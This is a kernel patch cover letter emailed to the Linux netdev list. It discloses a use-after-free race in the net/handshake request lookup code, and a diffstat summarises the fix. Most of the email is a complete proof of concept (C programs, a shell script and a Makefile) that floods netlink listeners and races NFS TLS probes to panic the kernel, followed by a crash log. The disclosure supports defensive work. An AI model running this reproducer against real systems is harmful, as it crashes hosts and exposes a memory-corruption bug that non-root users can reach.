Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D9B8F3612DB
	for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 17:04:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789923888; cv=none; b=bnqCYcW1W2ZqcQICZpbkY24zEvKqkiuL/8+Bz4Zp+RQv0AfI9xc+G3NPxPbhtMQsOW+s5XjTayjIvCirbQiYh8oQWZDLrg29IgYPigRI8q71le/GwhIrqd/KD4VAWKUoVn0yvzpQSvwqMm35rWDSOq89U9V7vihewleX2lnADto=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789923888; c=relaxed/simple;
	bh=Uwr8hw8y9yI063/qJQ3QE7ZY1IlUwno3rd+uTvjAMKQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kKXUo9EnfUQSLF6BQX1bwFK3qheop+CU43z0jsMoJOC38e6LLF/3s0IgSFVcgYYsnlICCTbs2IufEDC3cvm7y2xby7gJiuowdV6csQnSCY1wK40lMHp22MAUhMF2xz5hxibaHyAgdnZrJ/oIm24dZY/H7CeOLL0UpFqXfgXMU8U=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=PlJSpB2y; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="PlJSpB2y"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-39b910bdf2eso1493674a91.2
        for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 10:04:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789923886; x=1790528686; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vgYFDxzEBcrBmuUJWA4nlEximFEGVLuVzcLRZutaBYo=;
        b=PlJSpB2yljayRAr1oMxL1fwFbmKrkDXUq0+0YdCGs/yTdu32Zny9w6XJ7d8hsVbzUG
         r2wqasrpXlmN6KE0xnbeqCjz0WF8f3vW6MiRPuHdAkd49tUG0xBT3tfJatF3q35xu2CX
         V1lxelwGQWckd3zrs/2rqse2PNE73kqykPSxn3JIPhadKurl3Ct/A8VazW1cacN8VdME
         5E45RRht6mazjr1ylUrbtmxZOyRfrVxoozhSN37BxCPoOGTlSa0qd3LPspvQB5b49P/7
         NvrQ6mu3tghSPRRBh1bgrGvhqvWLVD1EomlvXt27/MKuYCQdJrAT2JGJ/p3yhB/TYHUu
         C1Gg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789923886; x=1790528686;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vgYFDxzEBcrBmuUJWA4nlEximFEGVLuVzcLRZutaBYo=;
        b=dMZ6nx+iadAksVE+Lbs0rWqVptKRiF84Hx6tcENpcmY3ZAuPzNu+ldm+wSvre7W3NG
         4L5GfHLdf+x10BgmHoLUdl8jDYHl64jHFrWUgeAShUlCD1m3Hkh5f589wzMYcrjpeBA9
         CYDvOv+LdG7JZv0T+kVmZKjRAo3euQwK6UdSH99MHXlLjf6gfyVXWtkttTl+sKyf25GR
         dp0I5fHI4yokOob5jiKKEZOdXUlhYjFV8t01u/LhiHl/b99w7zQIxCr1nQInvAVIiBSe
         INtx5zP3kp8tWzJx7TOQiH+OZIyBXnmlMCIM9W5WrxXwAiJyKJ8ujf9akBvb+mNN/2Qd
         t+Dw==
X-Forwarded-Encrypted: i=1; AKwUvByYMoJcxukHFJnhpoRckdZZMj34CdXW/xZZAiMkfUsg/VbG26JO6ze2BeBHdqCfEhFgFG5j5FE=@vger.kernel.org
X-Gm-Message-State: AFuF++kAL348S+rKvcx7FQogvpZfDKwAYjdH/A5uIuF//oNotEbM134i
	XuvIjVWs130imaye/rkaHr/gr50RAvTmA2dUdwnJDST6qQWQIgAecnDSNq/X+Zhoe6c9
X-Gm-Gg: AYBFou0ENq7o2mtPb7uY+yQkGmJ8agiFH97g+GsJmlrhgM/Z6m7umXvbxgr0l7rsIfc
	p5wXk3FFvZgxknIVG9tJIlDVCyhrHr51TxGUetKfFedBSLti9GEBTSQZMGF6MXmm/3M0Cc9zH/7
	7haHOOpJb8MyroJwlX8I0lieW4wolSK9HEwiHU+GnmkJmo5K5uVDfs/m3AGgfAm/M1rER6hopRc
	cEUls9tyKVNNVU6hxnABMR7m+JjYKGPBYnQ/cruN27euKKVx7D6VV/3tM2LrDjMLx5hDag/le4w
	Cm7B6U13Hq5HSNlTt/qmb45GUmjl0ruHjjgf9SO1VKPjA8PXRtBTD//GhfcV2dcsGZSxjgrRTsU
	RA+t2l5EtmzfkPtFEDoqaG3hwfNdae1845KqGGeRp0OLyHhQBipKDnJzQxoa/TIA9PHNkTpoeT8
	GEjCKWoYwvyNs1SQ0S18w54Iox8qjQ51dBuNLcAmUBz8b+ES3gixwoHj9V+J+RqqenG6jBjBEOj
	5nsCJePCw==
X-Received: by 2002:a17:90b:398c:b0:3a0:46c7:7c47 with SMTP id 98e67ed59e1d1-3a046c77f24mr1045600a91.37.1789923885868;
        Sun, 20 Sep 2026 10:04:45 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a041b87bfesm2639291a91.3.2026.09.20.10.04.37
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 20 Sep 2026 10:04:45 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: kernel-tls-handshake@lists.linux.dev,
	netdev@vger.kernel.org
Cc: cel@kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net/handshake: Protect request hash lookups
Date: Mon, 21 Sep 2026 01:04:12 +0800
Message-ID: <cover.1789819174.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated a issue in net/handshake/request.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

handshake_req_hash_lookup() uses rhashtable_lookup_fast(), which drops
the RCU read lock internally and returns a naked pointer without taking
any lifetime reference.

When handshake_req_submit() encounters an error during notification
(such as when the generic-netlink multicast receive queues are filled and
handshake_genl_notify() fails), it removes the request from the pending
list and immediately frees it synchronously via handshake_req_destroy()
and kfree().

If an asynchronous transport teardown or cancellation races that unwind,
concurrent callers such as tls_handshake_close(), handshake_req_cancel(),
or handshake_nl_done_doit() look up the request and dereference freed
memory. In addition, the rhashtable lookup itself races with kfree(),
leading to a KASAN panic in memcmp.

Furthermore, handshake_req_next() dequeues a pending request without
taking a reference on the request. If FD_PREPARE() or hp_accept() fails
after a concurrent cancellation or socket close has released the submit
file pin, dropping the file pin in handshake_nl_accept_doit() can trigger
socket destruction immediately, freeing the request before
handshake_complete() or trace_handshake_cmd_accept_err() completes.

Root cause:
handshake_req_hash_lookup() returns a request pointer without acquiring
a reference count under RCU protection, and handshake_req_destroy() frees
the request memory synchronously via kfree() without waiting for an RCU
grace period. In addition, handshake_req_next() does not hold a request
lifetime reference across the accept preparation and error paths.

Reproducer:

    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#define NLA_NEXT(nla, attrlen) \
	((attrlen) -= NLA_ALIGN((nla)->nla_len), \
	 (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#define NLA_OK(nla, len) \
	((len) >= (int)sizeof(struct nlattr) && (nla)->nla_len >= sizeof(struct nlattr) && \
	 (nla)->nla_len <= (len))

struct rpc_probe {
	uint32_t recmark;
	uint32_t xid;
	uint32_t msg_type;
	uint32_t rpcvers;
	uint32_t prog;
	uint32_t vers;
	uint32_t proc;
	uint32_t cred_flavor;
	uint32_t cred_len;
	uint32_t verf_flavor;
	uint32_t verf_len;
};

struct worker_arg {
	const struct sockaddr_in *addr;
	unsigned int delay_us;
	unsigned int attempts;
	unsigned int id;
};

static atomic_uint global_xid = 0x41410000;
static atomic_ulong total_attempts;
static atomic_int stop_now;

static int nl_open(void)
{
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_GENERIC);
	if (fd < 0)
		return -1;
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}

static int nl_send_getfamily(int fd, const char *family)
{
	struct {
		struct nlmsghdr nlh;
		struct genlmsghdr genl;
		struct nlattr nla;
		char name[32];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN),
			.nlmsg_type = GENL_ID_CTRL,
			.nlmsg_flags = NLM_F_REQUEST,
			.nlmsg_seq = 1,
		},
		.genl = {
			.cmd = CTRL_CMD_GETFAMILY,
			.version = 1,
		},
		.nla = {
			.nla_type = CTRL_ATTR_FAMILY_NAME,
		},
	};
	size_t len = strlen(family) + 1;

	if (len > sizeof(req.name)) {
		errno = ENAMETOOLONG;
		return -1;
	}

	memcpy(req.name, family, len);
	req.nla.nla_len = NLA_HDRLEN + len;
	req.nlh.nlmsg_len += NLMSG_ALIGN(req.nla.nla_len);

	return send(fd, &req, req.nlh.nlmsg_len, 0);
}

static int parse_mcast_group_id(const char *buf, ssize_t len, const char *group)
{
	const struct nlmsghdr *nlh;

	for (nlh = (const struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		const struct genlmsghdr *genl;
		int attrlen;
		const struct nlattr *attr;

		if (nlh->nlmsg_type == NLMSG_ERROR)
			return -1;

		genl = NLMSG_DATA(nlh);
		attr = (const struct nlattr *)((const char *)genl + GENL_HDRLEN);
		attrlen = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);

		for (; NLA_OK(attr, attrlen); attr = NLA_NEXT(attr, attrlen)) {
			if (attr->nla_type != CTRL_ATTR_MCAST_GROUPS)
				continue;

			int nested_len = attr->nla_len - NLA_HDRLEN;
			const struct nlattr *entry =
				(const struct nlattr *)((const char *)attr + NLA_HDRLEN);

			for (; NLA_OK(entry, nested_len);
			     entry = NLA_NEXT(entry, nested_len)) {
				int grp_len = entry->nla_len - NLA_HDRLEN;
				const struct nlattr *grp =
					(const struct nlattr *)((const char *)entry + NLA_HDRLEN);
				const char *name = NULL;
				uint32_t id = 0;

				for (; NLA_OK(grp, grp_len); grp = NLA_NEXT(grp, grp_len)) {
					if (grp->nla_type == CTRL_ATTR_MCAST_GRP_NAME)
						name = NLA_DATA(grp);
					else if (grp->nla_type == CTRL_ATTR_MCAST_GRP_ID)
						memcpy(&id, NLA_DATA(grp), sizeof(id));
				}
				if (name && strcmp(name, group) == 0)
					return (int)id;
			}
		}
	}

	errno = ENOENT;
	return -1;
}

static int nl_resolve_mcast_group(const char *family, const char *group)
{
	char buf[8192];
	int fd, id;
	ssize_t len;

	fd = nl_open();
	if (fd < 0)
		return -1;
	if (nl_send_getfamily(fd, family) < 0) {
		close(fd);
		return -1;
	}

	len = recv(fd, buf, sizeof(buf), 0);
	close(fd);
	if (len < 0)
		return -1;

	id = parse_mcast_group_id(buf, len, group);
	return id;
}

static int *open_listeners(unsigned int count)
{
	int group_id;
	int *fds;

	group_id = nl_resolve_mcast_group("handshake", "tlshd");
	if (group_id < 0) {
		perror("resolve handshake tlshd group");
		return NULL;
	}

	fds = calloc(count, sizeof(*fds));
	if (!fds)
		return NULL;

	for (unsigned int i = 0; i < count; i++) {
		int fd;
		int rcvbuf = 1024;

		fd = nl_open();
		if (fd < 0) {
			perror("nl_open");
			count = i;
			break;
		}
		setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
		if (setsockopt(fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP,
			       &group_id, sizeof(group_id)) < 0) {
			perror("NETLINK_ADD_MEMBERSHIP");
			close(fd);
			count = i;
			break;
		}
		fds[i] = fd;
	}

	fprintf(stderr, "opened %u multicast listeners on group %d\n",
		count, group_id);
	return fds;
}

static void close_listeners(int *fds, unsigned int count)
{
	if (!fds)
		return;
	for (unsigned int i = 0; i < count; i++)
		if (fds[i] > 0)
			close(fds[i]);
	free(fds);
}

static void on_signal(int sig)
{
	(void)sig;
	atomic_store(&stop_now, 1);
}

static int send_probe(const struct sockaddr_in *addr, unsigned int delay_us)
{
	struct rpc_probe probe = {
		.recmark = htonl(0x80000028),
		.xid = htonl(atomic_fetch_add(&global_xid, 1)),
		.msg_type = htonl(0),
		.rpcvers = htonl(2),
		.prog = htonl(100003),
		.vers = htonl(4),
		.proc = htonl(0),
		.cred_flavor = htonl(7),
		.cred_len = htonl(0),
		.verf_flavor = htonl(0),
		.verf_len = htonl(0),
	};
	struct linger ling = { .l_onoff = 1, .l_linger = 0 };
	const int one = 1;
	int fd;
	ssize_t n;

	fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		return -1;

	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));

	if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) < 0) {
		close(fd);
		return -1;
	}

	n = send(fd, &probe, sizeof(probe), MSG_NOSIGNAL);
	if (n != sizeof(probe)) {
		close(fd);
		return -1;
	}

	if (delay_us) {
		struct timespec ts = {
			.tv_sec = delay_us / 1000000U,
			.tv_nsec = (long)(delay_us % 1000000U) * 1000L,
		};

		nanosleep(&ts, NULL);
	}

	close(fd);
	return 0;
}

static void *worker(void *data)
{
	const struct worker_arg *arg = data;
	unsigned int i = 0;

	while (!atomic_load(&stop_now)) {
		if (arg->attempts && i >= arg->attempts)
			break;
		send_probe(arg->addr, arg->delay_us);
		atomic_fetch_add(&total_attempts, 1);
		i++;
	}

	fprintf(stderr, "worker %u done after %u attempts\n", arg->id, i);
	return NULL;
}

static unsigned int parse_u32(const char *s, const char *name)
{
	char *end;
	unsigned long v;

	errno = 0;
	v = strtoul(s, &end, 0);
	if (errno || !s[0] || *end || v > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(1);
	}
	return (unsigned int)v;
}

int main(int argc, char **argv)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(2049),
	};
	int *listener_fds = NULL;
	struct worker_arg *args;
	pthread_t *threads;
	unsigned int workers = 32;
	unsigned int delay_us = 2000;
	unsigned int attempts = 0;
	unsigned int listeners = 0;
	unsigned int port = 2049;
	int opt;
	int rc = 0;

	while ((opt = getopt(argc, argv, "h:p:t:d:n:l:")) != -1) {
		switch (opt) {
		case 'h':
			if (inet_pton(AF_INET, optarg, &addr.sin_addr) != 1) {
				fprintf(stderr, "invalid host: %s\n", optarg);
				return 1;
			}
			break;
		case 'p':
			port = parse_u32(optarg, "port");
			if (port > 65535) {
				fprintf(stderr, "invalid port: %u\n", port);
				return 1;
			}
			addr.sin_port = htons(port);
			break;
		case 't':
			workers = parse_u32(optarg, "threads");
			break;
		case 'd':
			delay_us = parse_u32(optarg, "delay_us");
			break;
		case 'n':
			attempts = parse_u32(optarg, "attempts");
			break;
		case 'l':
			listeners = parse_u32(optarg, "listeners");
			break;
		default:
			fprintf(stderr,
				"usage: %s [-h host] [-p port] [-t threads] [-d delay_us] [-n attempts_per_thread] [-l listeners]\n",
				argv[0]);
			return 1;
		}
	}

	if (!addr.sin_addr.s_addr)
		inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	if (listeners) {
		listener_fds = open_listeners(listeners);
		if (!listener_fds) {
			fprintf(stderr, "failed to open listeners\n");
			return 1;
		}
	}

	threads = calloc(workers, sizeof(*threads));
	args = calloc(workers, sizeof(*args));
	if (!threads || !args) {
		perror("calloc");
		return 1;
	}

	fprintf(stderr,
		"target=%s:%u threads=%u delay_us=%u attempts_per_thread=%u listeners=%u\n",
		inet_ntoa(addr.sin_addr), port, workers, delay_us, attempts, listeners);

	for (unsigned int i = 0; i < workers; i++) {
		args[i].addr = &addr;
		args[i].delay_us = delay_us;
		args[i].attempts = attempts;
		args[i].id = i;
		rc = pthread_create(&threads[i], NULL, worker, &args[i]);
		if (rc) {
			errno = rc;
			perror("pthread_create");
			atomic_store(&stop_now, 1);
			workers = i;
			break;
		}
	}

	for (unsigned int i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);

	fprintf(stderr, "total_attempts=%lu\n",
		(unsigned long)atomic_load(&total_attempts));
	close_listeners(listener_fds, listeners);
	free(args);
	free(threads);
	return 0;
}
------END poc.c--------

------BEGIN listener.c------
#include <errno.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>
#include <netlink/netlink.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static volatile sig_atomic_t stop_now;

static void on_signal(int sig)
{
	(void)sig;
	stop_now = 1;
}

static unsigned int parse_u32(const char *s, const char *name)
{
	char *end;
	unsigned long v;

	errno = 0;
	v = strtoul(s, &end, 0);
	if (errno || !s[0] || *end || v > 1000000UL) {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(1);
	}
	return (unsigned int)v;
}

int main(int argc, char **argv)
{
	struct nl_sock **socks;
	unsigned int count = 256;
	int grp;

	if (argc > 1)
		count = parse_u32(argv[1], "count");

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	socks = calloc(count, sizeof(*socks));
	if (!socks) {
		perror("calloc");
		return 1;
	}

	socks[0] = nl_socket_alloc();
	if (!socks[0]) {
		fprintf(stderr, "nl_socket_alloc failed\n");
		return 1;
	}
	if (genl_connect(socks[0]) < 0) {
		fprintf(stderr, "genl_connect failed\n");
		return 1;
	}

	grp = genl_ctrl_resolve_grp(socks[0], "handshake", "tlshd");
	if (grp < 0) {
		fprintf(stderr, "genl_ctrl_resolve_grp failed: %s\n", nl_geterror(grp));
		return 1;
	}
	nl_socket_free(socks[0]);
	socks[0] = NULL;

	for (unsigned int i = 0; i < count; i++) {
		socks[i] = nl_socket_alloc();
		if (!socks[i]) {
			fprintf(stderr, "nl_socket_alloc failed at %u\n", i);
			count = i;
			break;
		}
		nl_socket_set_buffer_size(socks[i], 1024, 0);
		if (genl_connect(socks[i]) < 0) {
			fprintf(stderr, "genl_connect failed at %u\n", i);
			nl_socket_free(socks[i]);
			socks[i] = NULL;
			count = i;
			break;
		}
		if (nl_socket_add_membership(socks[i], grp) < 0) {
			fprintf(stderr, "membership failed at %u\n", i);
			nl_socket_free(socks[i]);
			socks[i] = NULL;
			count = i;
			break;
		}
	}

	fprintf(stderr, "opened %u listeners on group %d\n", count, grp);
	while (!stop_now)
		sleep(1);

	for (unsigned int i = 0; i < count; i++)
		if (socks[i])
			nl_socket_free(socks[i]);
	free(socks);
	return 0;
}
------END listener.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
THREADS=${THREADS:-32}
ATTEMPTS=${ATTEMPTS:-0}
LISTENERS=${LISTENERS:-1024}
DELAYS=${DELAYS:-"1800 2000 2200 2500"}

mount -t nfsd nfsd /proc/fs/nfsd 2>/dev/null || true
if ! pgrep -x rpcbind >/dev/null 2>&1; then
	rpcbind -w
	sleep 1
fi

echo tcp 2049 > /proc/fs/nfsd/portlist 2>/dev/null || true
echo 8 > /proc/fs/nfsd/threads

make -C "$DIR" poc >/dev/null
gcc -O2 -pthread -Wall -Wextra \
	$(pkg-config --cflags libnl-3.0 libnl-genl-3.0) \
	-o "$DIR/listener" "$DIR/listener.c" \
	$(pkg-config --libs libnl-3.0 libnl-genl-3.0)

"$DIR/listener" "$LISTENERS" &
listener_pid=$!
trap 'kill $listener_pid 2>/dev/null || true; wait $listener_pid 2>/dev/null || true' EXIT INT TERM
sleep 2

pids=""
for delay in $DELAYS; do
	"$DIR/poc" -t "$THREADS" -d "$delay" -n "$ATTEMPTS" &
	pids="$pids $!"
done

for pid in $pids; do
	wait "$pid"
done
------END poc.sh--------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -pthread -Wall -Wextra
NL_CFLAGS := $(shell pkg-config --cflags libnl-3.0 libnl-genl-3.0 2>/dev/null)
NL_LIBS := $(shell pkg-config --libs libnl-3.0 libnl-genl-3.0 2>/dev/null)

all: poc

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

listener: listener.c
	$(CC) $(CFLAGS) $(NL_CFLAGS) -o $@ $< $(NL_LIBS)

clean:
	rm -f poc listener
------END Makefile--------

----BEGIN crash log----
[  412.463830][ T9855] page_owner tracks the page as allocated

[  412.464323][ T9855] page last allocated via order 1, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9854, tgid 9854 (nfsd), ts 373315545222, free_ts 371596521038

[  412.465765][ T9855] page last free pid 15 tgid 15 stack trace:

[  412.466314][ T9855] Kernel panic - not syncing: KASAN: panic_on_warn set ...

[  412.466795][ T9855] CPU: 1 UID: 0 PID: 9855 Comm: nfsd Not tainted 7.1.0-rc1 #2 PREEMPT(full) 

[  412.467375][ T9855] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[  412.468078][ T9855] Call Trace:

[  412.468307][ T9855]  <TASK>

[  412.468506][ T9855]  vpanic+0x6c3/0x790

[  412.468772][ T9855]  ? __pfx_vpanic+0x10/0x10

[  412.469077][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.469470][ T9855]  ? memcmp+0x176/0x1d0

[  412.469745][ T9855]  panic+0xca/0xd0

[  412.469994][ T9855]  ? __pfx_panic+0x10/0x10

[  412.470293][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.470665][ T9855]  ? preempt_schedule_common+0x42/0xc0

[  412.471028][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.471409][ T9855]  ? preempt_schedule_thunk+0x16/0x30

[  412.471776][ T9855]  check_panic_on_warn+0x61/0x80

[  412.472107][ T9855]  end_report+0x13e/0x180

[  412.472402][ T9855]  kasan_report+0xf4/0x120

[  412.472702][ T9855]  ? memcmp+0x176/0x1d0

[  412.472986][ T9855]  memcmp+0x176/0x1d0

[  412.473253][ T9855]  handshake_req_hash_lookup+0x264/0x700

[  412.473640][ T9855]  ? __pfx_handshake_req_hash_lookup+0x10/0x10

[  412.474042][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.474422][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.474799][ T9855]  ? find_held_lock+0x2b/0x80

[  412.475116][ T9855]  tls_handshake_close+0x32/0x70

[  412.475455][ T9855]  svc_tcp_sock_detach+0x48/0x4f0

[  412.475790][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.476162][ T9855]  svc_delete_xprt+0x12b/0xa00

[  412.476483][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.476856][ T9855]  ? svc_pool_wake_idle_thread+0x20a/0x830

[  412.477249][ T9855]  svc_recv+0x16df/0x2630

[  412.477552][ T9855]  ? __pfx_svc_recv+0x10/0x10

[  412.477869][ T9855]  ? nfsd+0x389/0xa80

[  412.478144][ T9855]  nfsd+0x2db/0xa80

[  412.478406][ T9855]  ? __entry_text_end+0x1020b5/0x1020b9

[  412.478770][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.479148][ T9855]  ? _raw_spin_unlock_irqrestore+0x57/0x80

[  412.479544][ T9855]  ? __pfx_nfsd+0x10/0x10

[  412.479830][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.480206][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.480590][ T9855]  ? __kthread_parkme+0xb4/0x200

[  412.480928][ T9855]  ? __pfx_nfsd+0x10/0x10

[  412.481220][ T9855]  kthread+0x312/0x410

[  412.481518][ T9855]  ? _raw_spin_unlock_irq+0x28/0x50

[  412.481863][ T9855]  ? __pfx_kthread+0x10/0x10

[  412.482171][ T9855]  ret_from_fork+0x600/0xa20

[  412.482493][ T9855]  ? __pfx_ret_from_fork+0x10/0x10

[  412.482835][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5

[  412.483212][ T9855]  ? __switch_to+0x57f/0xe20

[  412.483527][ T9855]  ? __pfx_kthread+0x10/0x10

[  412.483841][ T9855]  ret_from_fork_asm+0x1a/0x30

[  412.484181][ T9855]  </TASK>

[  412.485060][ T9855] Kernel Offset: disabled

[  412.485370][ T9855] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Luxiao Xu

Luxiao Xu (1):
  net/handshake: Protect request hash lookups

 net/handshake/handshake-test.c |  3 +++
 net/handshake/handshake.h      |  5 ++++
 net/handshake/netlink.c        |  3 +++
 net/handshake/request.c        | 43 +++++++++++++++++++++++++++++-----
 net/handshake/tlshd.c          |  8 +++----
 5 files changed, 52 insertions(+), 10 deletions(-)

-- 
2.43.0
